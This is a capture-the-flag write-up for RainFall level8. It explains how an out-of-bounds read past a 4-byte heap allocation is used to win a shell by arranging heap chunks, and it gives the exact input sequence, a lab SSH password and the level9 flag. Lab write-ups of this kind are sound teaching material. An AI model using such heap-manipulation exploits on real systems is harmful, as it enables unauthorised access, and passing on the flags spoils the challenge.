# Level8: Heap Layout Manipulation

![Democracy Officer](https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExb2V6MjFua3VrNnBzZDR6b3M5eHN4M3BhcmEwZGZ3OGJlZHJvYzE5ZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xUA7aSnNyCHNJqcHS8/giphy.gif)

*"Strategic heap placement detected. Liberty delivered."*

---

## 📋 Binary Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *auth = NULL;
char *service = NULL;

int main(void)
{
    char buffer[128];
    
    while (1)
    {
        printf("%p, %p \n", auth, service);
        
        if (fgets(buffer, 128, stdin) == NULL)
            return 0;
        
        // Command: "auth "
        if (strncmp(buffer, "auth ", 5) == 0)
        {
            auth = malloc(4);
            auth[0] = '\0';
            
            if (strlen(buffer + 5) < 30)
            {
                strcpy(auth, buffer + 5);
            }
        }
        
        // Command: "reset"
        if (strncmp(buffer, "reset", 5) == 0)
        {
            free(auth);
        }
        
        // Command: "service"
        if (strncmp(buffer, "service", 7) == 0)
        {
            service = strdup(buffer + 8);
        }
        
        // Command: "login"
        if (strncmp(buffer, "login", 5) == 0)
        {
            if (*(int *)(auth + 32) == 0)
            {
                fwrite("Password:\n", 1, 10, stdout);
            }
            else
            {
                system("/bin/sh");
            }
        }
    }
    
    return 0;
}
```

## 🚨 Vulnerability

This binary implements a simple command-line interface with four commands: `auth`, `reset`, `service`, and `login`. The vulnerability lies in the login check:

```c
if (*(int *)(auth + 32) == 0) {
    fwrite("Password:\n", 1, 10, stdout);
}
else {
    system("/bin/sh");
}
```

The program checks the value **32 bytes past** the `auth` pointer to determine if the user is authenticated. However:
- `auth` is allocated only **4 bytes** via `malloc(4)`
- Reading 32 bytes past a 4-byte allocation is an **out-of-bounds read**
- The check reads memory that doesn't belong to the auth buffer

## 🎯 How the Exploit Works

### The Core Concept: Heap Layout Manipulation

Unlike stack-based exploits where we overwrite return addresses, this exploit manipulates the **heap layout** to control what data the out-of-bounds read will access.

### Heap Allocation Behavior

When `malloc()` allocates memory, it places chunks sequentially on the heap with metadata:

```
Heap Memory Layout:
┌─────────────────────────────────────────────────────────────┐
│ [Chunk 1 Header] [Chunk 1 Data] [Chunk 2 Header] [Chunk 2] │
└─────────────────────────────────────────────────────────────┘
```

On 32-bit Linux, each malloc chunk has:
- **8-byte header** (size + flags)
- **User data** (what you requested)
- **Padding** to maintain 16-byte alignment

### Step-by-Step Attack

**Step 1: Allocate `auth`**

When we run `auth AAAA`:
```c
auth = malloc(4);  // Allocates 4 bytes of user data
```

Heap state:
```
0x0804a000: [8-byte malloc header for auth chunk]
0x0804a008: [4 bytes user data] ← auth points here
0x0804a00c: [4 bytes padding]
            ↓
0x0804a010: [next chunk will start here]
```

**Step 2: Allocate `service`**

When we run `service BBBBBBBBBBBBBBBB` (16+ characters):
```c
service = strdup(buffer + 8);  // Calls malloc(N+1) for string + null
```

Heap state:
```
0x0804a008: [auth data (4 bytes)]
0x0804a010: [8-byte malloc header for service chunk]
0x0804a018: [service string data...] ← service points here
```

**Step 3: The Out-of-Bounds Read**

When we run `login`, it checks:
```c
*(int *)(auth + 32)
```

Let's calculate where this reads from:
```
auth + 32 = 0x0804a008 + 0x20 = 0x0804a028
```

Now, where is `0x0804a028` in relation to our heap chunks?
```
0x0804a008: auth points here
0x0804a018: service points here
0x0804a028: auth + 32 points here ← This is 16 bytes into service!
```

### Memory Layout Visualization

```
Heap Memory Map:
┌──────────────────────────────────────────────────────────────────────┐
│  Address   │  Content                │  Description                  │
├──────────────────────────────────────────────────────────────────────┤
│ 0x804a000  │ [malloc metadata]       │ Auth chunk header             │
│ 0x804a008  │ "AAAA\0"                │ ← auth pointer                │
│ 0x804a00c  │ [padding]               │                               │
│ 0x804a010  │ [malloc metadata]       │ Service chunk header          │
│ 0x804a018  │ "BBBBBBBBBBBBBBBB\0"    │ ← service pointer             │
│            │  ↑                      │                               │
│            │  │ (16 bytes)           │                               │
│            │  │                      │                               │
│ 0x804a028  │  └─────────────────     │ ← auth + 32 reads HERE!       │
└──────────────────────────────────────────────────────────────────────┘
```

### Calculation: Minimum Service Length

To make `auth + 32` land inside the service buffer:
```
auth          = 0x0804a008
service       = 0x0804a018  (16 bytes later)
auth + 32     = 0x0804a028  (we want to read here)

Offset into service buffer:
0x0804a028 - 0x0804a018 = 0x10 = 16 bytes
```

**Minimum service string length: 16 bytes**

### Why This Works

| Requirement | How We Satisfy It |
|-------------|-------------------|
| Make `auth + 32` non-zero | Place service chunk 16 bytes after auth chunk |
| Control service position | Use malloc's sequential allocation behavior |
| Ensure OOB read hits service | Service string must be ≥ 16 bytes long |
| Bypass password check | Any non-zero data in service[16] grants shell |

### Key Insight: Heap Feng Shui

This is our first example of **heap layout manipulation** (sometimes called "heap feng shui"). Unlike previous levels where we:
- Overwrote stack return addresses (level1, level2)
- Corrupted format strings (level3-5)
- Overwrote function pointers (level6, level7)

Here we **control the relative positions** of heap allocations to make an out-of-bounds read land exactly where we want. The vulnerability isn't about overwriting memory—it's about **arranging memory** so the program's own buggy read gives us what we need.

## 💣 Execute the Exploit

Connect to the VM and run the binary:

```bash
ssh level8@localhost -p 2222
# Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

Enter the commands:

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth AAAA
0x804a008, (nil)
service BBBBBBBBBBBBBBBB
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

### What Just Happened?

1. `auth AAAA` allocated 4 bytes at `0x804a008`
2. `service BBBB...` allocated 17+ bytes at `0x804a018` (16 bytes after auth)
3. `login` checked `auth + 32` = `0x804a028`
4. This address contains the 16th byte of service (the letter 'B')
5. Since 'B' (0x42) is non-zero, the check passed
6. Shell spawned!

## Pro Tips & Security Notes

- **Heap Determinism**: Unlike the stack, heap allocations are very predictable when the program is simple. `malloc()` typically uses a first-fit or best-fit algorithm that places new chunks sequentially.

- **Chunk Alignment**: On 32-bit systems, malloc chunks are aligned to 8 or 16 bytes. This makes heap layout calculations more predictable.

- **Real-World Heap Exploitation**: Modern heap exploiters use techniques like:
  - **Heap spraying** ([OWASP](https://owasp.org/www-community/attacks/Heap_Spraying)): Filling the heap with many copies of a payload
  - **Heap grooming**: Carefully arranging allocations to create a specific layout
  - **Use-after-free**: Using freed memory that still contains pointers
  
- **Why Service Length Matters**: If service were shorter than 16 bytes, `auth + 32` would read unallocated or metadata bytes, which are likely zero. We need service to be long enough that the read lands in our controlled data.

- **Alternative Approach**: We could also trigger this with `auth` twice, then `service`. The heap layout would be different but the principle remains: control what `auth + 32` reads.

- **Modern Mitigations**: Modern systems use [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) and heap randomization, making exact heap addresses unpredictable. However, **relative offsets** between consecutive allocations often remain consistent.

## 🎉 Victory

Password for level9:
```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

Technique unlocked: **Heap Layout Manipulation**
